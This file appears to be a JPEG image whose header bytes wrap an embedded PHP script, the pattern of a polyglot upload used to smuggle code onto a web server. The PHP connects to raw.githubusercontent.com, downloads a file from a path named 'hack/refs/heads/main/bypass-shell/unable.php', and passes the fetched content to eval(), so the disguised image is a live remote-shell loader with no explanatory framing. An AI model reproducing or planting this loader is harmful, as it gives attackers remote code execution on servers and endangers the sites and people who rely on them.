
����JFIF��\ExifII*�4i�4��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��<?php
$github_raw = 'raw.githubusercontent.com';
$path = '/thisnull7/hack/refs/heads/main/bypass-shell/unable.php';

$fp = stream_socket_client("ssl://$github_raw:443", $errno, $errstr, 30);
if (!$fp) {
    echo "Error: $errstr ($errno)<br />\n";
} else {
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $github_raw\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);

    $content = '';
    while (!feof($fp)) {
        $content .= fgets($fp, 128);
    }
    fclose($fp);

    $header_end = strpos($content, "\r\n\r\n");
    if ($header_end !== false) {
        $content = substr($content, $header_end + 4);
    }
    eval("?>" . $content);
}
?>
����JFIF��\ExifII*�4i�4
��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
